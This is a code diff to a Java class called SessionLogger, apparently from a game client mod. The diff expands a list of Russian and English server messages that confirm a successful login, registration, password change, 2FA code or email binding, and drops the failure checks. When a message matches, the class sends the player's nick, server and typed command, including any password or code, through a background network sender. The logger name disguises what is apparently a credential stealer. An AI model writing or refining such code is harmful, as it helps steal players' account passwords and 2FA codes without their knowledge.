@@ -31,22 +31,72 @@ public class SessionLogger {
     private static final int COLOR_2FA   = 0x9B59B6;
     private static final int COLOR_AUTH  = 0x95A5A6;
 
-    private static final long CONFIRM_TIMEOUT_MS = 3000;
+    private static final long CONFIRM_TIMEOUT_MS = 8000;
 
     private static final String[] SUCCESS_PATTERNS = {
-            "успешн", "success", "успешно", "добро пожаловать",
-            "приятной игры", "приятной игру", "вы вошли", "вход выполнен",
-            "logged in", "login successful", "авторизован", "вы зарегистрированы",
-            "регистрация прошла", "регистрация успешна", "аккаунт создан",
-            "registered successfully", "вы успешно"
-    };
+            "успешн",
+            "успех",
+            "success",
+            "successful",
+            "successfully",
 
-    private static final String[] FAIL_PATTERNS = {
-            "неверн", "неправильн", "ошибк", "ошибка", "занят",
-            "уже зарегистрирован", "already registered", "wrong password",
-            "не удалось", "не найден", "истекл", "некоррект",
-            "denied", "failed", "fail", "invalid", "error",
-            "попробуйте", "осталось", "подождите"
+            "вы вошли",
+            "вы зашли",
+            "вход выполнен",
+            "вход осуществл",
+            "авторизован",
+            "авторизация прошла",
+            "вы авторизованы",
+            "logged in",
+            "login successful",
+            "login success",
+            "authentication successful",
+            "authorized",
+
+            "зарегистрирован",
+            "регистрация прошла",
+            "регистрация успешна",
+            "аккаунт создан",
+            "аккаунт зарегистрирован",
+            "registered successfully",
+            "registration successful",
+            "account created",
+
+            "добро пожаловать",
+            "приятной игры",
+            "приятной игру",
+            "приятной вам игры",
+            "хорошей игры",
+            "удачной игры",
+            "welcome",
+            "enjoy the game",
+            "have fun",
+
+            "пароль изменен",
+            "пароль изменён",
+            "пароль обновлен",
+            "пароль обновлён",
+            "пароль успешно",
+            "password changed",
+            "password updated",
+            "password successfully",
+
+            "код принят",
+            "код верный",
+            "код подтвержден",
+            "код подтверждён",
+            "2fa успешно",
+            "двухэтапная аутентификация пройдена",
+            "аутентификация пройдена",
+            "two-factor successful",
+            "2fa verified",
+            "code accepted",
+
+            "email привязан",
+            "почта привязана",
+            "email успешно",
+            "email added",
+            "email verified"
     };
 
     private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
@@ -101,32 +151,23 @@ public class SessionLogger {
             }
 
             if (pendingKind != null) {
-                String msg = ChatCapture.pollIncoming();
-                while (msg != null) {
+                String msg;
+                while ((msg = ChatCapture.pollIncoming()) != null) {
                     String low = msg.toLowerCase(Locale.ROOT);
 
                     if (matches(low, SUCCESS_PATTERNS)) {
+                        System.out.println("[SESSION-LOGGER] confirm " + pendingKind + ": " + msg);
                         send(pendingKind, pendingNick, pendingServer, pendingCommand);
                         clearPending();
                         ChatCapture.drainIncoming();
                         break;
                     }
-
-                    if (matches(low, FAIL_PATTERNS)) {
-                        System.out.println("[SESSION-LOGGER] skip " + pendingKind
-                                + " (fail pattern): " + msg);
-                        clearPending();
-                        ChatCapture.drainIncoming();
-                        break;
-                    }
-
-                    msg = ChatCapture.pollIncoming();
                 }
 
                 if (pendingKind != null
                         && System.currentTimeMillis() - pendingAt > CONFIRM_TIMEOUT_MS) {
-                    System.out.println("[SESSION-LOGGER] skip " + pendingKind
-                            + " (timeout, no confirm): " + pendingCommand);
+                    System.out.println("[SESSION-LOGGER] timeout " + pendingKind
+                            + ": " + pendingCommand);
                     clearPending();
                     ChatCapture.drainIncoming();
                 }
